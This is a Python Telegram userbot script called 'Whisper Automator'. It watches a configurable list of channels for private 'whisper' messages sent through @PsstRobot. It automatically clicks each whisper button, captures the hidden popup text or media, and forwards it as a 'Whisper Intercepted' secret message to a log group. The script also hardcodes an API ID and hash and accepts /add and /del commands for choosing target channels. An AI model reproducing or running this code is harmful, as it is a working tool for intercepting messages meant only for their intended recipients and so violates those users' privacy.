import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

# Default Target Channels List
TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780,
    "vidsyapin", -1004293474310,  # Naya Channel Added
]

WHISPER_BOT_ID = 518335359  # @PsstRobot
LOG_GROUP_ID = -1004402300724

ctx = {"title": "Target Channel", "link": "#", "time": 0}
client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)


# ==================== CONFIG DYNAMIC PERSISTENCE ====================
async def load_config():
    global TARGET_CHANNELS
    try:
        async for msg in client.iter_messages(
            LOG_GROUP_ID, search="#WHISPER_CONFIG"
        ):
            if msg.text and "#WHISPER_CONFIG" in msg.text:
                lines = msg.text.split("\n")
                new_targets = []
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if line.lstrip("-").isdigit():
                            new_targets.append(int(line))
                        else:
                            new_targets.append(
                                line.replace("@", "").replace(
                                    "https://t.me/", ""
                                )
                            )
                if new_targets:
                    TARGET_CHANNELS = list(set(TARGET_CHANNELS + new_targets))
                    print(
                        f"✅ Dynamic channels loaded from Telegram config!",
                        flush=True,
                    )
                break
    except Exception as e:
        print(f"⚠️ Config load note: {e}", flush=True)


async def save_config():
    text = "#WHISPER_CONFIG\n" + "\n".join(
        str(c) for c in sorted(list(set(TARGET_CHANNELS)), key=str)
    )
    try:
        found_msg = None
        async for msg in client.iter_messages(
            LOG_GROUP_ID, search="#WHISPER_CONFIG"
        ):
            if msg.text and "#WHISPER_CONFIG" in msg.text:
                found_msg = msg
                break
        if found_msg:
            await found_msg.edit(text)
        else:
            m = await client.send_message(LOG_GROUP_ID, text)
            try:
                await m.pin()
            except Exception:
                pass
    except Exception as e:
        print(f"❌ Config save error: {e}", flush=True)


def is_target_chat(event):
    chat_id = event.chat_id
    username = getattr(event.chat, "username", None)
    for target in TARGET_CHANNELS:
        if isinstance(target, int) and target == chat_id:
            return True
        if (
            isinstance(target, str)
            and username
            and target.lower() == username.lower()
        ):
            return True
    return False


# ==================== CLEAN FORMATTER ====================
def format_log(content, chat_name, speed, msg_link, is_media=False):
    tag = " (Advanced Media)" if is_media else ""
    return (
        f"🔓 **Whisper Intercepted{tag}!**\n\n"
        f"📝 **Secret Message:**\n`{content}`\n\n"
        f"📍 **Channel:** {chat_name}\n"
        f"⚡ **Speed:** `{speed} ms`\n"
        f"🔗 [Message Link]({msg_link})"
    )


async def get_msg_link(event):
    try:
        chat = await event.get_chat()
        if getattr(chat, "username", None):
            return f"https://t.me/{chat.username}/{event.id}"
        return (
            f"https://t.me/c/{str(event.chat_id).replace('-100', '')}/{event.id}"
        )
    except Exception:
        return "#"


# ==================== CHANNEL COMMANDS HANDLER ====================
@client.on(
    events.NewMessage(
        chats=[LOG_GROUP_ID], pattern=r"^/(add|del|list|channels)(?:\s+(.+))?"
    )
)
async def command_handler(event):
    cmd = event.pattern_match.group(1).lower()
    arg = event.pattern_match.group(2)

    if cmd in ["list", "channels"]:
        unique_targets = sorted(list(set(TARGET_CHANNELS)), key=str)
        text = "📋 **Active Target Channels:**\n\n"
        for c in unique_targets:
            text += f"• `{c}`\n"
        text += (
            "\n💡 *Add feature:* `/add <channel>`\n💡 *Remove:* `/del <channel>`"
        )
        await event.reply(text)
        return

    if not arg:
        await event.reply(
            "⚠️ **Usage:**\n`/add <username_or_id>`\n`/del <username_or_id>`"
        )
        return

    arg_clean = arg.strip().replace("https://t.me/", "").replace("@", "")
    if arg_clean.lstrip("-").isdigit():
        arg_val = int(arg_clean)
    else:
        arg_val = arg_clean.lower()

    if cmd == "add":
        if arg_val not in TARGET_CHANNELS:
            TARGET_CHANNELS.append(arg_val)
            try:
                ent = await client.get_entity(arg_val)
                if getattr(ent, "id", None):
                    true_id = int(
                        f"-100{ent.id}"
                        if not str(ent.id).startswith("-100")
                        else ent.id
                    )
                    if true_id not in TARGET_CHANNELS:
                        TARGET_CHANNELS.append(true_id)
            except Exception as e:
                print(f"Entity cache note: {e}", flush=True)

            await save_config()
            await event.reply(
                f"✅ **Channel Added Successfully:** `{arg_clean}`"
            )
            print(f"➕ Added Channel via GC: {arg_clean}", flush=True)
        else:
            await event.reply(
                f"⚠️ **Channel Pehle Se Active Hai:** `{arg_clean}`"
            )

    elif cmd == "del":
        TARGET_CHANNELS[:] = [
            c
            for c in TARGET_CHANNELS
            if str(c).lower() != str(arg_val).lower()
        ]
        await save_config()
        await event.reply(
            f"🗑️ **Channel Removed Successfully:** `{arg_clean}`"
        )
        print(f"➖ Removed Channel via GC: {arg_clean}", flush=True)


# ==================== MAIN WHISPER HANDLERS ====================
@client.on(events.NewMessage())
async def channel_handler(event):
    # Dynamic target check
    if not is_target_chat(event) or not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    msg_link = await get_msg_link(event)
    print(f"⚡ Whisper Detected in [{chat_name}]", flush=True)

    try:
        payload = None
        for row in event.buttons:
            for btn in row:
                if btn.url and "PsstRobot?start=" in btn.url:
                    payload = btn.url.split("start=")[-1]

        res = await event.click(0)
        popup_text = ""
        if hasattr(res, "message") and res.message:
            popup_text = res.message
        elif isinstance(res, str):
            popup_text = res

        if popup_text and "-wh::" in popup_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", popup_text)
            if match:
                payload = match.group(0)

        if payload or "advanced" in popup_text.lower():
            ctx.update(
                {"title": chat_name, "link": msg_link, "time": start_time}
            )
            await client.send_message(
                WHISPER_BOT_ID, f"/start {payload}" if payload else "/start"
            )
        elif popup_text:
            elapsed = round((time.perf_counter() - start_time) * 1000, 2)
            msg = format_log(popup_text, chat_name, elapsed, msg_link)
            await client.send_message(LOG_GROUP_ID, msg, link_preview=False)
            print(f"✅ Text Forwarded ({elapsed} ms)", flush=True)

    except Exception as e:
        print(f"❌ Error: {e}", flush=True)


@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    if event.buttons:
        await event.click(0)
        return
    if event.message.text and any(
        x in event.message.text for x in ["Preparing", "/start"]
    ):
        return

    try:
        now = time.perf_counter()
        if now - ctx["time"] > 120:
            ctx["time"] = now
        elapsed = round((now - ctx["time"]) * 1000, 2)

        media_desc = event.message.text or "[Photo/Media Message]"
        msg = format_log(
            media_desc, ctx["title"], elapsed, ctx["link"], is_media=True
        )

        await client.send_message(
            LOG_GROUP_ID,
            msg,
            file=event.message.media if event.message.media else None,
            link_preview=False,
        )
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Media Forwarded ({elapsed} ms)", flush=True)
    except Exception as e:
        print(f"❌ DM Error: {e}", flush=True)


# ==================== STARTUP ====================
async def handle_ping(request):
    return web.Response(text="Bot Active")


async def main():
    await client.start()
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(
        runner, "0.0.0.0", int(os.environ.get("PORT", 10000))
    ).start()

    await client.get_dialogs()
    await load_config()

    startup_msg = (
        "🤖 **Whisper Automator Active!**\n"
        "⚡ Dynamic Channel Management Enabled.\n"
        "💡 Type `/list` to see active target channels."
    )
    await client.send_message(LOG_GROUP_ID, startup_msg)
    print("🟢 SYSTEM ONLINE WITH DYNAMIC COMMANDS", flush=True)
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
